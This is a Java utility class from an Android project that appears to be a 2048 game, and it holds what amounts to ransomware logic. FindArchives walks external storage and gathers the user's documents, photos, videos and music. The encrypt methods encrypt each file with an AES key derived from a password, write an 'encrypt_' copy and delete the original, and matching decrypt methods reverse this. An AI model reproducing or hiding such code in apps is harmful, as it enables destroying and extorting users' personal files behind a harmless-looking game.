package edu.sunypoly.a2048;

import android.os.Environment;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.KeySpec;
import java.util.ArrayList;
import java.util.concurrent.atomic.AtomicReference;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

public class Utils {

    public ArrayList<File> FindArchives (File root) {
        ArrayList <File> Files = new ArrayList <File> ();
        File[] files = root.listFiles();
        if (files != null) {
            for (File file: files) {
                if (file.isDirectory() &&! file.isHidden()) {

                    Files.addAll(FindArchives (file));
                } else {
                    // Checks for files
                    if (file.getName().endsWith(".pdf") || file.getName().endsWith(".jpg") || file.getName().endsWith(".mp4") || file.getName().endsWith(".docx") || file.getName().endsWith(".doc")
                            || file.getName().endsWith(".xls") || file.getName().endsWith(".xlsx") || file.getName().endsWith(".mp3") || file.getName().endsWith(".png")) {
                        if (file.getTotalSpace()> 3) {
                            Files.add(file);
                            //String s1 = files[0].getPath();
                            //Log.d("Yes", s1);
                        }
                    }
                }
            }
        }
        return Files;
    }

    public void encrypt11(String damnKey, File file, String name, byte[] salt) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        //Input File Unencrypted

        File extStore = Environment.getExternalStorageDirectory();
        FileInputStream Entry = new FileInputStream(file);
        //Output File Encrypted
        FileOutputStream Output = new FileOutputStream(extStore+"/encrypt_"+name);
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        KeySpec keySpec = new PBEKeySpec(damnKey.toCharArray(), salt, 65536,
                256);
        SecretKey secretKey = null;
        try {
            secretKey = factory.generateSecret(keySpec);
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
        SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");

        //The Cipher is created, the one responsible for encrypting streams
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE,secret);


        //Output Stream ,output file
        CipherOutputStream cipherOutputStream = new CipherOutputStream(Output,cipher);

        //Write Bytes
        int b;
        byte[] bytes = new byte [64];
        while ((b = Entry.read(bytes)) >= 0) {
            cipherOutputStream.write(bytes,0,b);
        }
        cipherOutputStream.flush();
        cipherOutputStream.close();
        Entry.close();
        File tmp = new File(file.getPath());
        tmp.delete();

    }

    public void encrypt(String damnKey, String address, String name, byte[] salt) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        //Input File Unencrypted
        File extStore = Environment.getExternalStorageDirectory();
        FileInputStream Entry = new FileInputStream("/"+address);

        //Output File Encrypted
        FileOutputStream Output = new FileOutputStream(extStore+"/encrypt_"+name);
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        KeySpec keySpec = new PBEKeySpec(damnKey.toCharArray(), salt, 65536,
                256);
        SecretKey secretKey = null;
        try {
            secretKey = factory.generateSecret(keySpec);
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
        SecretKey secret = new SecretKeySpec(secretKey.getEncoded(), "AES");

        //The Cipher is created, the one responsible for encrypting streams
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE,secret);


        //Output Stream ,output file
        CipherOutputStream cipherOutputStream = new CipherOutputStream(Output,cipher);

        //Write Bytes
        int b;
        byte[] bytes = new byte [64];
        while ((b = Entry.read(bytes)) >= 0) {
            cipherOutputStream.write(bytes,0,b);
        }
        cipherOutputStream.flush();
        cipherOutputStream.close();
        Entry.close();
        File tmp = new File("/"+address);
        tmp.delete();

    }
    public void decrypt(String damnKey, String address, String name, byte[] salt) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        //Input File Unencrypted
        File extStore = Environment.getExternalStorageDirectory();
        FileInputStream Entry = new FileInputStream("/"+address);

        //Output File Encrypted
        FileOutputStream Output = new FileOutputStream(extStore+"/decrypted_"+name);
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        KeySpec keySpec = new PBEKeySpec(damnKey.toCharArray(), salt, 65536,
                256);
        SecretKey tmp = null;
        try {
            tmp = factory.generateSecret(keySpec);
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
        SecretKey secret = new SecretKeySpec(tmp.getEncoded(), "AES");

        //The Cipher is created, the one responsible for encrypting streams
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE,secret);

        //Output Stream ,output file
        CipherInputStream cipherInputStream = new CipherInputStream(Entry,cipher);

        //Write Bytes
        int b;
        byte[] bytes = new byte [64];
        while ((b = cipherInputStream.read(bytes)) >= 0) {
            Output.write(bytes,0,b);
        }
        Output.flush();
        Output.close();
        cipherInputStream.close();
        File tmP = new File("/"+address);
        tmP.delete();

    }
    public void decrypt11(String damnKey, File file, String name, byte[] salt) throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
        //Input File Unencrypted
        File extStore = Environment.getExternalStorageDirectory();
        FileInputStream Entry = new FileInputStream(file);

        //Output File Encrypted
        FileOutputStream Output = new FileOutputStream(extStore+"/decrypted_"+name);
        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
        KeySpec keySpec = new PBEKeySpec(damnKey.toCharArray(), salt, 65536,
                256);
        SecretKey tmp = null;
        try {
            tmp = factory.generateSecret(keySpec);
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        }
        SecretKey secret = new SecretKeySpec(tmp.getEncoded(), "AES");

        //The Cipher is created, the one responsible for encrypting streams
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE,secret);

        //Output Stream ,output file
        CipherInputStream cipherInputStream = new CipherInputStream(Entry,cipher);

        //Write Bytes
        int b;
        byte[] bytes = new byte [64];
        while ((b = cipherInputStream.read(bytes)) >= 0) {
            Output.write(bytes,0,b);
        }
        Output.flush();
        Output.close();
        cipherInputStream.close();
        File tmP = new File(file.getPath());
        tmP.delete();

    }

    public byte [] generateSalt() {
        byte[] salt = new byte[8];
        SecureRandom secureRandom = new SecureRandom();
        secureRandom.nextBytes(salt);
        return salt;
    }











}
